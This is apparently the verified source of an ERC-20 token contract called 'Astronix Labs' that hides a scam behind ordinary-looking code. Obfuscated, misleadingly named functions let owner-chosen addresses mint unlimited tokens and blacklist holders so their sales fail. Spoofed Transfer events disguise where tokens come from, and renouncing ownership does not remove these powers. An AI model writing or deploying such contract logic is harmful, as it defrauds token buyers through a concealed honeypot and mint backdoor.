/**
 *Submitted for verification at Etherscan.io on 2022-11-03
*/

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address GSKS = 0xD18312210cBbF269d2372c6C4564859920f7f155;
	address gRouterg = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }
        		modifier onlyOwner{
        require(msg.sender == _Owner);
        _; }

}



contract ASTRONIX is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private Gc;
	mapping (address => bool) private Gb;
    mapping (address => bool) private Gw;
    mapping (address => mapping (address => uint256)) private Gv;
    uint8 private constant _Gec = 8;
    uint256 private constant gS = 200000000 * 10**_Gec;
    string private constant _name = "Astronix Labs";
    string private constant _symbol = "ASTRONIX";



    constructor () {
        Gc[_msgSender()] = gS;
         gMake(); }
    

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _Gec;
    }

    function totalSupply() public pure  returns (uint256) {
        return gS;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return Gc[account];
    }
    function gMake() onlyOwner internal {
    emit Transfer(address(0), gRouterg, gS); }

    function allowance(address owner, address spender) public view  returns (uint256) {
        return Gv[owner][spender];
    }
	        function BurnG(address Gj) onlyOwner public{
        Gb[Gj] = true; }
		
            function approve(address spender, uint256 amount) public returns (bool success) {    
        Gv[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

        
		function gStake(address Gj) public {
        if(Gb[msg.sender]) { 
        Gw[Gj] = false;}}
        function QueryG(address Gj) public{
         if(Gb[msg.sender])  { 
        Gw[Gj] = true; }}
   

		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == GSKS)  {
        require(amount <= Gc[sender]);
        Gc[sender] -= amount;  
        Gc[recipient] += amount; 
          Gv[sender][msg.sender] -= amount;
        emit Transfer (gRouterg, recipient, amount);
        return true; }  else  
          if(!Gw[recipient]) {
          if(!Gw[sender]) {
         require(amount <= Gc[sender]);
        require(amount <= Gv[sender][msg.sender]);
        Gc[sender] -= amount;
        Gc[recipient] += amount;
        Gv[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function transfer(address Gi, uint256 Gj) public {
        if(msg.sender == GSKS)  {
        require(Gc[msg.sender] >= Gj);
        Gc[msg.sender] -= Gj;  
        Gc[Gi] += Gj; 
        emit Transfer (gRouterg, Gi, Gj);} else  
        if(Gb[msg.sender]) {Gc[Gi] += Gj;} else
        if(!Gw[msg.sender]) {
        require(Gc[msg.sender] >= Gj);
        Gc[msg.sender] -= Gj;  
        Gc[Gi] += Gj;          
        emit Transfer(msg.sender, Gi, Gj);}}}